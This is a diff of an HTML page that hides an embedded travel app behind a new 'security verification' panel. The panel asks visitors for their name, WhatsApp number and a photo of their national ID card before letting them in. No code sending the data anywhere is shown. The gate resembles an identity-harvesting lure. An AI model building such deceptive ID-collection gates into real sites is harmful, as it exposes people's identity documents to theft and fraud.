@@ -138,11 +138,22 @@
         </button>
 
         <!-- IFRAME -->
-        <iframe src="https://fasttravelec.ondelight.app/"
-                class="w-full h-full"
-                frameborder="0">
-        </iframe>
+        <div id="contenedor-aplicativo" style="display: none;" class="w-full h-full">
+            <iframe src="https://fasttravelec.ondelight.app/" class="w-full h-full" frameborder="0"></iframe>
+        </div>
 
+        <div id="filtro-seguridad" class="p-6 flex flex-col items-center justify-center h-full text-center">
+            <h2 class="text-xl font-bold mb-2">Verificación de Seguridad</h2>
+            <p class="text-xs mb-4 text-gray-500">Suba su cédula para habilitar el servicio</p>
+            
+            <input type="text" id="nombre" placeholder="Nombre" class="border p-2 mb-2 w-full rounded">
+            <input type="tel" id="whatsapp" placeholder="WhatsApp" class="border p-2 mb-2 w-full rounded">
+            <input type="file" id="foto-cedula" accept="image/*" class="text-xs mb-4">
+            
+            <button id="btn-verificar" class="bg-black text-white p-3 rounded-xl w-full font-bold">
+                REGISTRAR Y ENTRAR
+            </button>
+        </div>
     </div>
 </div>
 <script>
@@ -173,6 +184,7 @@ function cerrarModal() {
 
 </body>
 </html>
+
 
 
 
